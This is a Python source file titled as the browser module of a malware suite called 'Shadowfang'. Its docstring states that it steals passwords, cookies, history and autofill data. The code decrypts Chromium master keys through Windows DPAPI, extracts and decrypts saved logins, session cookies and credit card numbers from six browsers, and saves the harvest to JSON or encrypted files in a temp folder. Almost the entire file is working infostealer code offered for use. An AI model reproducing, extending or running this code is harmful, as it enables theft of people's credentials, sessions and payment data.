#!/usr/bin/env python3
"""
SHADOWFANG MODULES - BROWSER.PY
Browser credential theft and data extraction module
Steals passwords, cookies, history, autofill from all major browsers
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import threading
import subprocess
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== BROWSER CONSTANTS ====================

class BrowserConstants:
    """Browser paths and configuration"""
    
    # Browser data directories
    BROWSERS = {
        'chrome': {
            'name': 'Google Chrome',
            'paths': [
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google\\Chrome\\User Data'),
                os.path.join(os.environ.get('APPDATA', ''), 'Google\\Chrome\\User Data')
            ],
            'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3'],
            'key_file': 'Local State',
            'login_db': 'Login Data',
            'cookies_db': 'Cookies',
            'history_db': 'History',
            'autofill_db': 'Web Data'
        },
        'firefox': {
            'name': 'Mozilla Firefox',
            'paths': [
                os.path.join(os.environ.get('APPDATA', ''), 'Mozilla\\Firefox\\Profiles')
            ],
            'profiles': None,  # Dynamic
            'key_file': 'key4.db',
            'login_db': 'logins.json',
            'cookies_db': 'cookies.sqlite',
            'history_db': 'places.sqlite',
            'autofill_db': 'formhistory.sqlite'
        },
        'edge': {
            'name': 'Microsoft Edge',
            'paths': [
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft\\Edge\\User Data'),
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Edge\\User Data')
            ],
            'profiles': ['Default', 'Profile 1', 'Profile 2'],
            'key_file': 'Local State',
            'login_db': 'Login Data',
            'cookies_db': 'Cookies',
            'history_db': 'History',
            'autofill_db': 'Web Data'
        },
        'opera': {
            'name': 'Opera',
            'paths': [
                os.path.join(os.environ.get('APPDATA', ''), 'Opera Software\\Opera Stable')
            ],
            'profiles': ['Default'],
            'key_file': 'Local State',
            'login_db': 'Login Data',
            'cookies_db': 'Cookies',
            'history_db': 'History',
            'autofill_db': 'Web Data'
        },
        'brave': {
            'name': 'Brave',
            'paths': [
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware\\Brave-Browser\\User Data'),
                os.path.join(os.environ.get('APPDATA', ''), 'BraveSoftware\\Brave-Browser\\User Data')
            ],
            'profiles': ['Default', 'Profile 1'],
            'key_file': 'Local State',
            'login_db': 'Login Data',
            'cookies_db': 'Cookies',
            'history_db': 'History',
            'autofill_db': 'Web Data'
        },
        'vivaldi': {
            'name': 'Vivaldi',
            'paths': [
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Vivaldi\\User Data')
            ],
            'profiles': ['Default'],
            'key_file': 'Local State',
            'login_db': 'Login Data',
            'cookies_db': 'Cookies',
            'history_db': 'History',
            'autofill_db': 'Web Data'
        }
    }
    
    # Output directory
    OUTPUT_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'browser_data'
    )

# ==================== CHROMIUM DECRYPTER ====================

class ChromiumDecrypter:
    """Decrypt Chromium-based browser data"""
    
    def __init__(self):
        self.master_key = None
    
    def get_master_key(self, local_state_path):
        """Extract master key from Local State file"""
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Get encrypted key
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            
            if not encrypted_key:
                return None
            
            # Decode base64
            encrypted_key = base64.b64decode(encrypted_key)
            
            # Remove DPAPI prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using DPAPI
            key = self._dpapi_decrypt(encrypted_key)
            
            self.master_key = key
            return key
            
        except Exception as e:
            logger.warning(f"Master key extraction failed: {e}")
            return None
    
    def _dpapi_decrypt(self, encrypted_data):
        """Decrypt data using Windows DPAPI"""
        try:
            import win32crypt
            
            # Decrypt using CryptUnprotectData
            decrypted = win32crypt.CryptUnprotectData(
                encrypted_data,
                None,
                None,
                None,
                0
            )
            
            return decrypted[1]
            
        except ImportError:
            # Fallback using ctypes
            return self._dpapi_decrypt_ctypes(encrypted_data)
        except:
            return None
    
    def _dpapi_decrypt_ctypes(self, encrypted_data):
        """DPAPI decryption using ctypes"""
        try:
            import ctypes
            from ctypes import wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ('cbData', wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))
                ]
            
            crypt32 = ctypes.windll.crypt32
            kernel32 = ctypes.windll.kernel32
            
            # Create input blob
            input_blob = DATA_BLOB()
            input_blob.cbData = len(encrypted_data)
            input_blob.pbData = ctypes.cast(
                ctypes.create_string_buffer(encrypted_data),
                ctypes.POINTER(ctypes.c_char)
            )
            
            # Create output blob
            output_blob = DATA_BLOB()
            
            # Decrypt
            result = crypt32.CryptUnprotectData(
                ctypes.byref(input_blob),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(output_blob)
            )
            
            if result:
                # Extract decrypted data
                decrypted = ctypes.string_at(
                    output_blob.pbData,
                    output_blob.cbData
                )
                
                # Free memory
                kernel32.LocalFree(output_blob.pbData)
                
                return decrypted
            
            return None
            
        except:
            return None
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password using AES-GCM (Chrome v80+)"""
        try:
            if not self.master_key:
                return None
            
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            # Chrome v80+ format: v10 + nonce(12) + ciphertext + tag(16)
            if encrypted_password.startswith(b'v10'):
                # Extract nonce and ciphertext
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:]
                
                # Decrypt using AES-GCM
                aesgcm = AESGCM(self.master_key)
                decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                
                return decrypted.decode('utf-8', errors='ignore')
            else:
                # Old format: DPAPI encrypted
                decrypted = self._dpapi_decrypt(encrypted_password)
                if decrypted:
                    return decrypted.decode('utf-8', errors='ignore')
            
            return None
            
        except Exception as e:
            return None
    
    def decrypt_cookie(self, encrypted_cookie):
        """Decrypt cookie value"""
        return self.decrypt_password(encrypted_cookie)

# ==================== CHROME EXTRACTOR ====================

class ChromeExtractor:
    """Extract data from Chrome browser"""
    
    def __init__(self):
        self.decrypter = ChromiumDecrypter()
        self.extracted_data = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'autofill': [],
            'bookmarks': [],
            'credit_cards': []
        }
    
    def extract_all(self, browser_name='chrome'):
        """Extract all data from Chrome"""
        try:
            browser_config = BrowserConstants.BROWSERS.get(browser_name)
            if not browser_config:
                return None
            
            for base_path in browser_config['paths']:
                if not os.path.exists(base_path):
                    continue
                
                # Get master key
                local_state = os.path.join(base_path, browser_config['key_file'])
                self.decrypter.get_master_key(local_state)
                
                # Extract from each profile
                for profile in browser_config['profiles']:
                    profile_path = os.path.join(base_path, profile)
                    
                    if os.path.exists(profile_path):
                        self._extract_passwords(profile_path, browser_config['login_db'])
                        self._extract_cookies(profile_path, browser_config['cookies_db'])
                        self._extract_history(profile_path, browser_config['history_db'])
                        self._extract_autofill(profile_path, browser_config['autofill_db'])
                        self._extract_bookmarks(profile_path)
            
            logger.info(f"Chrome data extracted: {len(self.extracted_data['passwords'])} passwords")
            return self.extracted_data
            
        except Exception as e:
            logger.error(f"Chrome extraction failed: {e}")
            return None
    
    def _extract_passwords(self, profile_path, db_name):
        """Extract saved passwords"""
        try:
            db_path = os.path.join(profile_path, db_name)
            
            if not os.path.exists(db_path):
                return
            
            # Copy database (avoid lock)
            temp_db = self._copy_database(db_path)
            
            if not temp_db:
                return
            
            # Query passwords
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                password = self.decrypter.decrypt_password(encrypted_password)
                
                self.extracted_data['passwords'].append({
                    'url': url,
                    'username': username,
                    'password': password,
                    'browser': 'chrome'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            pass
    
    def _extract_cookies(self, profile_path, db_name):
        """Extract cookies"""
        try:
            db_path = os.path.join(profile_path, db_name)
            
            if not os.path.exists(db_path):
                return
            
            temp_db = self._copy_database(db_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT host_key, name, encrypted_value, expires_utc FROM cookies"
            )
            
            for row in cursor.fetchall():
                host = row[0]
                name = row[1]
                encrypted_value = row[2]
                
                value = self.decrypter.decrypt_cookie(encrypted_value)
                
                self.extracted_data['cookies'].append({
                    'host': host,
                    'name': name,
                    'value': value,
                    'browser': 'chrome'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _extract_history(self, profile_path, db_name):
        """Extract browsing history"""
        try:
            db_path = os.path.join(profile_path, db_name)
            
            if not os.path.exists(db_path):
                return
            
            temp_db = self._copy_database(db_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
            )
            
            for row in cursor.fetchall():
                self.extracted_data['history'].append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': row[3],
                    'browser': 'chrome'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _extract_autofill(self, profile_path, db_name):
        """Extract autofill data"""
        try:
            db_path = os.path.join(profile_path, db_name)
            
            if not os.path.exists(db_path):
                return
            
            temp_db = self._copy_database(db_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Autofill profiles
            cursor.execute("SELECT name, value FROM autofill")
            
            for row in cursor.fetchall():
                self.extracted_data['autofill'].append({
                    'name': row[0],
                    'value': row[1],
                    'browser': 'chrome'
                })
            
            # Credit cards
            cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
            
            for row in cursor.fetchall():
                card_number = self.decrypter.decrypt_password(row[1]) if row[1] else None
                
                self.extracted_data['credit_cards'].append({
                    'name': row[0],
                    'number': card_number,
                    'expiry': f"{row[2]}/{row[3]}",
                    'browser': 'chrome'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _extract_bookmarks(self, profile_path):
        """Extract bookmarks"""
        try:
            bookmarks_path = os.path.join(profile_path, 'Bookmarks')
            
            if not os.path.exists(bookmarks_path):
                return
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            def extract_bookmarks(node):
                if isinstance(node, dict):
                    if node.get('type') == 'url':
                        self.extracted_data['bookmarks'].append({
                            'name': node.get('name'),
                            'url': node.get('url'),
                            'browser': 'chrome'
                        })
                    elif 'children' in node:
                        for child in node['children']:
                            extract_bookmarks(child)
                elif isinstance(node, list):
                    for item in node:
                        extract_bookmarks(item)
            
            roots = bookmarks_data.get('roots', {})
            for root_name, root_data in roots.items():
                extract_bookmarks(root_data)
            
        except:
            pass
    
    def _copy_database(self, db_path):
        """Copy database to temp location"""
        try:
            temp_dir = os.path.join(BrowserConstants.OUTPUT_DIR, 'temp')
            os.makedirs(temp_dir, exist_ok=True)
            
            temp_db = os.path.join(temp_dir, os.path.basename(db_path) + f"_{datetime.now().timestamp()}")
            shutil.copy2(db_path, temp_db)
            
            return temp_db
            
        except:
            return None

# ==================== FIREFOX EXTRACTOR ====================

class FirefoxExtractor:
    """Extract data from Firefox browser"""
    
    def __init__(self):
        self.extracted_data = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'autofill': [],
            'bookmarks': []
        }
    
    def extract_all(self):
        """Extract all data from Firefox"""
        try:
            firefox_config = BrowserConstants.BROWSERS.get('firefox')
            base_path = firefox_config['paths'][0]
            
            if not os.path.exists(base_path):
                return None
            
            # Find profiles
            profiles_ini = os.path.join(base_path, 'profiles.ini')
            
            if os.path.exists(profiles_ini):
                profile_dirs = self._parse_profiles_ini(profiles_ini, base_path)
            else:
                profile_dirs = [d for d in os.listdir(base_path) if d.endswith('.default')]
            
            for profile_dir in profile_dirs:
                self._extract_passwords(profile_dir)
                self._extract_cookies(profile_dir)
                self._extract_history(profile_dir)
                self._extract_bookmarks(profile_dir)
            
            logger.info(f"Firefox data extracted: {len(self.extracted_data['passwords'])} passwords")
            return self.extracted_data
            
        except:
            return None
    
    def _parse_profiles_ini(self, profiles_ini, base_path):
        """Parse Firefox profiles.ini"""
        try:
            import configparser
            
            config = configparser.ConfigParser()
            config.read(profiles_ini)
            
            profile_dirs = []
            
            for section in config.sections():
                if section.startswith('Profile'):
                    profile_path = config.get(section, 'Path', fallback=None)
                    is_relative = config.getint(section, 'IsRelative', fallback=1)
                    
                    if profile_path:
                        if is_relative:
                            profile_dirs.append(os.path.join(base_path, profile_path))
                        else:
                            profile_dirs.append(profile_path)
            
            return profile_dirs
            
        except:
            return []
    
    def _extract_passwords(self, profile_dir):
        """Extract passwords from logins.json"""
        try:
            logins_path = os.path.join(profile_dir, 'logins.json')
            
            if not os.path.exists(logins_path):
                return
            
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
            
            for login in logins_data.get('logins', []):
                self.extracted_data['passwords'].append({
                    'url': login.get('hostname'),
                    'username': self._decode_firefox_value(login.get('encryptedUsername')),
                    'password': self._decode_firefox_value(login.get('encryptedPassword')),
                    'browser': 'firefox'
                })
            
        except:
            pass
    
    def _decode_firefox_value(self, encrypted_value):
        """Decode Firefox encrypted value"""
        try:
            # Firefox uses base64 encoded values
            if not encrypted_value:
                return None
            
            # Remove quotes if present
            if encrypted_value.startswith('"') and encrypted_value.endswith('"'):
                encrypted_value = encrypted_value[1:-1]
            
            return encrypted_value
            
        except:
            return None
    
    def _extract_cookies(self, profile_dir):
        """Extract cookies from cookies.sqlite"""
        try:
            cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
            
            if not os.path.exists(cookies_path):
                return
            
            temp_db = self._copy_database(cookies_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host, name, value FROM moz_cookies")
            
            for row in cursor.fetchall():
                self.extracted_data['cookies'].append({
                    'host': row[0],
                    'name': row[1],
                    'value': row[2],
                    'browser': 'firefox'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _extract_history(self, profile_dir):
        """Extract history from places.sqlite"""
        try:
            history_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(history_path):
                return
            
            temp_db = self._copy_database(history_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 100"
            )
            
            for row in cursor.fetchall():
                self.extracted_data['history'].append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'browser': 'firefox'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _extract_bookmarks(self, profile_dir):
        """Extract bookmarks from places.sqlite"""
        try:
            history_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(history_path):
                return
            
            temp_db = self._copy_database(history_path)
            
            if not temp_db:
                return
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute(
                "SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1"
            )
            
            for row in cursor.fetchall():
                self.extracted_data['bookmarks'].append({
                    'name': row[0],
                    'url': row[1],
                    'browser': 'firefox'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except:
            pass
    
    def _copy_database(self, db_path):
        """Copy database to temp location"""
        try:
            temp_dir = os.path.join(BrowserConstants.OUTPUT_DIR, 'temp')
            os.makedirs(temp_dir, exist_ok=True)
            
            temp_db = os.path.join(temp_dir, os.path.basename(db_path) + f"_{datetime.now().timestamp()}")
            shutil.copy2(db_path, temp_db)
            
            return temp_db
            
        except:
            return None

# ==================== GENERIC EXTRACTOR ====================

class GenericExtractor:
    """Extract data from other Chromium-based browsers"""
    
    def __init__(self):
        self.decrypter = ChromiumDecrypter()
    
    def extract_browser(self, browser_name):
        """Extract data from specified browser"""
        try:
            browser_config = BrowserConstants.BROWSERS.get(browser_name)
            if not browser_config:
                return None
            
            extractor = ChromeExtractor()
            return extractor.extract_all(browser_name)
            
        except:
            return None

# ==================== DATA SAVER ====================

class BrowserDataSaver:
    """Save extracted browser data"""
    
    def __init__(self):
        self.output_dir = BrowserConstants.OUTPUT_DIR
    
    def save_data(self, data, filename=None):
        """Save extracted data to file"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"browser_data_{timestamp}.json"
            
            filepath = os.path.join(self.output_dir, filename)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
            
            logger.info(f"Browser data saved: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Data save failed: {e}")
            return None
    
    def save_encrypted(self, data, encryption_key=None):
        """Save data encrypted"""
        try:
            import base64
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            if not encryption_key:
                encryption_key = os.urandom(32)
            
            # Serialize data
            json_data = json.dumps(data, default=str).encode()
            
            # Generate IV
            iv = os.urandom(16)
            
            # Encrypt
            cipher = Cipher(algorithms.AES(encryption_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(json_data) + padder.finalize()
            
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Save
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"browser_data_{timestamp}.enc")
            
            with open(filepath, 'wb') as f:
                f.write(iv + encrypted_data)
            
            return filepath
            
        except:
            return None

# ==================== MAIN BROWSER MANAGER ====================

class BrowserManager:
    """Main browser data extraction orchestrator"""
    
    def __init__(self):
        self.chrome_extractor = ChromeExtractor()
        self.firefox_extractor = FirefoxExtractor()
        self.generic_extractor = GenericExtractor()
        self.data_saver = BrowserDataSaver()
        self.all_data = {}
        self.extraction_complete = False
    
    def extract_all_browsers(self):
        """Extract data from all installed browsers"""
        logger.info("Starting browser data extraction...")
        
        all_data = {}
        
        # Extract Chrome
        try:
            chrome_data = self.chrome_extractor.extract_all('chrome')
            if chrome_data:
                all_data['chrome'] = chrome_data
                logger.info(f"Chrome: {len(chrome_data.get('passwords', []))} passwords extracted")
        except Exception as e:
            logger.warning(f"Chrome extraction failed: {e}")
        
        # Extract Firefox
        try:
            firefox_data = self.firefox_extractor.extract_all()
            if firefox_data:
                all_data['firefox'] = firefox_data
                logger.info(f"Firefox: {len(firefox_data.get('passwords', []))} passwords extracted")
        except:
            pass
        
        # Extract Edge
        try:
            edge_data = self.generic_extractor.extract_browser('edge')
            if edge_data:
                all_data['edge'] = edge_data
        except:
            pass
        
        # Extract Opera
        try:
            opera_data = self.generic_extractor.extract_browser('opera')
            if opera_data:
                all_data['opera'] = opera_data
        except:
            pass
        
        # Extract Brave
        try:
            brave_data = self.generic_extractor.extract_browser('brave')
            if brave_data:
                all_data['brave'] = brave_data
        except:
            pass
        
        self.all_data = all_data
        self.extraction_complete = True
        
        # Save data
        save_path = self.data_saver.save_data(all_data)
        
        logger.info(f"Browser extraction complete: {save_path}")
        return all_data
    
    def get_summary(self):
        """Get extraction summary"""
        summary = {
            'browsers': {},
            'total_passwords': 0,
            'total_cookies': 0,
            'total_history': 0,
            'total_autofill': 0
        }
        
        for browser_name, browser_data in self.all_data.items():
            passwords = len(browser_data.get('passwords', []))
            cookies = len(browser_data.get('cookies', []))
            history = len(browser_data.get('history', []))
            autofill = len(browser_data.get('autofill', []))
            
            summary['browsers'][browser_name] = {
                'passwords': passwords,
                'cookies': cookies,
                'history': history,
                'autofill': autofill
            }
            
            summary['total_passwords'] += passwords
            summary['total_cookies'] += cookies
            summary['total_history'] += history
            summary['total_autofill'] += autofill
        
        return summary
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            temp_dir = os.path.join(BrowserConstants.OUTPUT_DIR, 'temp')
            
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

browser_manager = BrowserManager()

# ==================== EXPORT ====================

__all__ = [
    'ChromiumDecrypter',
    'ChromeExtractor',
    'FirefoxExtractor',
    'GenericExtractor',
    'BrowserDataSaver',
    'BrowserManager',
    'browser_manager'
]